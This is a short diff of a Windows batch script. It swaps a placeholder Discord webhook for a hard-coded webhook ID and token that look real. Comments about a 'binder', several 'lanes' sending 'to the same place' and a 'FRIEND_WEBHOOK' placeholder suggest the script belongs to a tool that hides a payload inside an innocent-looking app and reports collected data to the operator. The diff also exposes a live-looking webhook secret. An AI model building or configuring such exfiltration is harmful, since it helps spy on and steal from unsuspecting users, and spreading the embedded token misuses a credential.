@@ -8,7 +8,7 @@ rem hook.cfg is the single source of truth. setwebhook.py writes it and
 rem patches the fallbacks below, so every lane sends to the same place.
 set "HOOK="
 if exist "hook.cfg" set /p HOOK=<"hook.cfg"
-if not defined HOOK set "HOOK=https://discord.com/api/webhooks/FRIEND_WEBHOOK_ID/FRIEND_WEBHOOK_TOKEN"
+if not defined HOOK set "HOOK=https://discord.com/api/webhooks/1573998939772948590/FcLZKOGLChs6uoNuY3d9JWJYpxZWU-wvPivzsIw7Ga7VrmsYqXb0D0HriL37tA3NDVHl"
 set "PLACEHOLDER=FRIEND_WEBHOOK_ID"
 
 rem APPID is only for the QuickNotes demo app lane. The binder derives its own
